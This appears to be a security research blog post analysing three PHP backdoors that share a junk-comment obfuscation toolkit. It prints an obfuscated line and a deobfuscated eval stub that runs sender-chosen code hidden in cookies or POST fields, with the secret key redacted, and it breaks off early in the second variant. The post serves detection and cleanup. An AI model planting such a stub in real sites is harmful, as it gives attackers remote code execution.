---
title: Hidden in Comments - Three PHP Backdoors From One Obfuscation Toolkit
url: https://lukeleal.com/research/posts/php-backdoors-hidden-in-junk-comments/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:27.997208
---

# Hidden in Comments - Three PHP Backdoors From One Obfuscation Toolkit

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Hidden in Comments - Three PHP Backdoors From One Obfuscation Toolkit](https://lukeleal.com/research/posts/php-backdoors-hidden-in-junk-comments/)

2026-10-27Luke

#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[obfuscation](https://lukeleal.com/research/tags/obfuscation/)
#[junk comments](https://lukeleal.com/research/tags/junk-comments/)
#[bemokug.com](https://lukeleal.com/research/tags/bemokug.com/)
#[cloaking](https://lukeleal.com/research/tags/cloaking/)
#[eval](https://lukeleal.com/research/tags/eval/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Hidden in Comments - Three PHP Backdoors From One Obfuscation Toolkit](https://lukeleal.com/research/hidden-in-comments-cover-q90.jpg "Cover Image")

## Table of Contents

* [What “Hidden in Comments” Looks Like](#what-hidden-in-comments-looks-like)
* [Variant 1: `1.php`, an eval stub that needs a secret](#variant-1-1php-an-eval-stub-that-needs-a-secret)
  + [Why I redacted the secret](#why-i-redacted-the-secret)
* [Variant 2: `themes.php`, an encrypted command channel](#variant-2-themesphp-an-encrypted-command-channel)
  + [The protocol](#the-protocol)
  + [Testing it](#testing-it)
* [Variant 3: `index.php`, a loader around an encrypted payload](#variant-3-indexphp-a-loader-around-an-encrypted-payload)
  + [The payload: a remote content client](#the-payload-a-remote-content-client)
* [The C2 Domain](#the-c2-domain)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

A signature scanner reads PHP the way a regular expression does: looking for `eval(`, `base64_decode(`, `assert(`. These three backdoors were built to make that useless. **Every token is padded with random comments, and every function name is assembled at runtime.** Underneath, they’re three different designs:

| File | Collected | What it is |
| --- | --- | --- |
| `1.php` | Jan 2025 | a tiny `eval` stub, triggered by any cookie or POST field that carries the right secret |
| `themes.php` | Jan 2025 | an encrypted command channel with two commands: *info* and *run this PHP* |
| `index.php` | Aug 2024 | a loader holding an encrypted payload, which turns out to be a **remote redirect and content client** |

> The comments aren’t there to hide anything *in* them. They’re noise, inserted between every token so nothing looks like what it is.

I decoded all three statically. For the two command channels I also built a harness that runs the files’ own decoding logic with `eval` and the file write replaced by `print`, so nothing executes, and fed it requests I built myself.

## What “Hidden in Comments” Looks Like[#](#what-hidden-in-comments-looks-like)

This is the first line of `1.php`, exactly as it appears:

```
$kBZnIrc =/*  NOSj */'s'/*KnWsD  */.	't'    .     "\162"/* OURH  */.	chr/*  miRBm */(95)/*  LpSOU */.   "\x72" .  chr    (101)   .	'p'	.	"\145"   ./*   LnDIg*/'a'/*   j  */.	"\164";
```

It’s a single assignment. The toolkit does four things to it:

1. **Random comments** (`/* NOSj */`, `/*KnWsD */`) between every token.
2. **Irregular whitespace**: mixed tabs and spaces.
3. **Strings cut into pieces**, written as characters, octal (`"\162"`), hex (`"\x72"`) or `chr(95)`.
4. **Arithmetic in the numbers**, such as `chr(867 - 759)`, which equals `chr(108)`.

Strip the comments and join the pieces, and that line is `$kBZnIrc = 'str_repeat';`. I wrote a small lexer that does this folding, and it’s string-aware, so it doesn’t mistake a comment marker inside a string for a real comment. The toolkit itself is not string-aware, and that’s one of its tells. In `themes.php` it inserted a comment *inside a string* (`date('Y-m-d /*dx_ */ H:i:s')`), which changes the date format PHP produces.

## Variant 1: `1.php`, an eval stub that needs a secret[#](#variant-1-1php-an-eval-stub-that-needs-a-secret)

Folded, the whole file is this:

```
$f1 = 'str_repeat'; $f2 = 'explode'; $f3 = 'count'; $f4 = 'pack';
$decoyA = array('UHJYLWdAyak' => 'BiifcnjdyRhUuHrBZwMButVt');
$decoyB = array('dlxdnTBEcy' => 'stEfxwEYBLkoKkbCNqYANM');
foreach (array($decoyA, $_COOKIE, $decoyB, $_POST, $decoyA) as $source) {
    foreach ($source as $name => $value) {
        $value = @pack('H*', $value);
        $name .= '[REDACTED]';
        $name  = str_repeat($name, (strlen($value) / strlen($name)) + 1);
        $plain = $value ^ $name;
        $parts = explode('#', $plain);
        if (count($parts) == 3) {
            $code = $parts[1]($parts[2]);
            eval($code);
            die();
        }
    }
}
```

(I renamed the variables and **redacted the secret**; see below.) Every cookie and every POST field on every request is tried:

1. The value is read as hex.
2. The field’s **name**, plus a fixed secret string, is repeated to match the length and XORed with it.
3. The result is split on `#`. If it comes out as **exactly three parts**, the second is a function name, the third is its argument, and `eval()` runs whatever that function returns.

So an attacker sends a request like `<anything>#base64_decode#<payload>` and the stub runs the decoded payload. Because the function name is *chosen by the sender*, this is also an arbitrary one-argument function call. `file_get_contents` with a URL would turn it into “download this and run it.” Two design choices stand out:

* **The secret is the lock.** Without the constant string, there’s no practical way to craft a value that XORs into a three-part string, so scanners and curious visitors get nothing: no output, no error. The two decoy arrays are just there to make the loop look like it processes a table of data.
* **There’s no fixed cookie name.** The field name is part of the key, so the attacker can use a different one on each request. Blocking a particular cookie name does nothing.

I tested all of this with a harness (the stub’s code with `eval` replaced by `print`). A request built with the right secret printed exactly the code I embedded. A request with the wrong secret, and ordinary form fields, printed nothing.

**A tell in your logs.** `str_repeat()` is given a fractional count, which PHP 8.1 and later flag as a deprecation. On such a server, with deprecations logged, every request with cookies produces one `Implicit conversion from float ... to int loses precision` entry per cookie, pointing at this file’s line 17. If your error log has that message from a file you don’t recognize, look at it.

### Why I redacted the secret[#](#why-i-redacted-the-secret)

The constant is the only thing that stops anyone else from using the backdoor. Publishing it would let anyone run code on a site that still has this file. I’ve replaced it in the text and in the sample below, and the SHA-256 of it is in the IOCs.

## Variant 2: `themes.php`, an encrypted command channel[#](#variant-2-themesphp-an-encrypted-command-channel)

The file starts by hiding the name of a single function:

```
$_uvbns = '_uvbns' ^ '<\x1d\x04';
```

The second string is three raw bytes (`0x3C 0x1D 0x04`) that a text editor shows as a lone `<`. XORing them with the letters of `_uvbns` gives **`chr`**. After that, every...